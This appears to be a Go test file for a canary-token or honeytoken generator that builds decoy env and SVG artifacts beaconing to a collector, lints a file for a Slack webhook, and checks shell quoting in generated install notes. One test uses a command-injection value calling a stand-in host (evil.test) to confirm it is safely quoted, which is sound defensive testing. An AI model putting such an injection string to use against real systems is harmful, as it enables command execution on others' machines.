package forge_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jimididit/kunari/internal/forge"
)

func TestForgeEnvRandomization(t *testing.T) {
	dir := t.TempDir()
	key := filepath.Join(dir, "key.hex")
	a, err := forge.Run(forge.Options{
		Type: "env", Name: "secrets", Theme: "devops", Detect: "beacon",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-1",
		OutDir: dir, KeyPath: key, RegistryDB: filepath.Join(dir, "reg.db"),
	})
	if err != nil {
		t.Fatal(err)
	}
	b, err := forge.Run(forge.Options{
		Type: "env", Name: "secrets", Theme: "devops", Detect: "beacon",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-1",
		OutDir: filepath.Join(dir, "b"), KeyPath: key,
	})
	if err != nil {
		t.Fatal(err)
	}
	ca, _ := os.ReadFile(a.ArtifactPath)
	cb, _ := os.ReadFile(b.ArtifactPath)
	if string(ca) == string(cb) {
		t.Fatal("expected randomized env artifacts to differ")
	}
	if a.TokenID == b.TokenID {
		t.Fatal("token ids must differ")
	}
}

func TestLintFlagsSlackWebhook(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "bad.env")
	_ = os.WriteFile(p, []byte("X=https://hooks.slack.com/services/T/B/X\n"), 0o644)
	r, err := forge.LintFile(p)
	if err != nil {
		t.Fatal(err)
	}
	if len(r.Findings) == 0 {
		t.Fatal("expected findings")
	}
}

func TestForgeSVG(t *testing.T) {
	dir := t.TempDir()
	_, err := forge.Run(forge.Options{
		Type: "svg", Name: "icon", Detect: "beacon",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-1",
		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
}

func TestInstallNotesDualLayerGuidance(t *testing.T) {
	dir := t.TempDir()
	res, err := forge.Run(forge.Options{
		Type: "env", Name: "secrets", Detect: "both",
		Collector: "https://beacon.example.com", AuthzRef: "LAB-1",
		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := os.ReadFile(res.InstallPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(body), "package agent") || !strings.Contains(string(body), "Dual-layer") {
		t.Fatalf("detect=both install notes should mention package agent dual-layer; got:\n%s", body)
	}
	res2, err := forge.Run(forge.Options{
		Type: "env", Name: "agentonly", Detect: "sentinel",
		AuthzRef: "LAB-1", OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
	body2, err := os.ReadFile(res2.InstallPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(body2), "--detect both") {
		t.Fatalf("detect=sentinel notes should prefer --detect both; got:\n%s", body2)
	}
}

func TestInstallNotesQuoteMemoAgainstShell(t *testing.T) {
	dir := t.TempDir()
	memo := "lab; $(curl evil.test) 'x'"
	res, err := forge.Run(forge.Options{
		Type: "env", Name: "secrets", Detect: "sentinel",
		Memo: memo, AuthzRef: "LAB-1",
		OutDir: dir, KeyPath: filepath.Join(dir, "k"),
	})
	if err != nil {
		t.Fatal(err)
	}
	body, err := os.ReadFile(res.InstallPath)
	if err != nil {
		t.Fatal(err)
	}
	text := string(body)
	if strings.Contains(text, `--memo "`) {
		t.Fatal("memo must use POSIX single quotes, not Go/double quotes")
	}
	want := "--memo '" + strings.ReplaceAll(memo, "'", `'\''`) + "'"
	if !strings.Contains(text, want) {
		t.Fatalf("want %q in install notes; got:\n%s", want, text)
	}
}
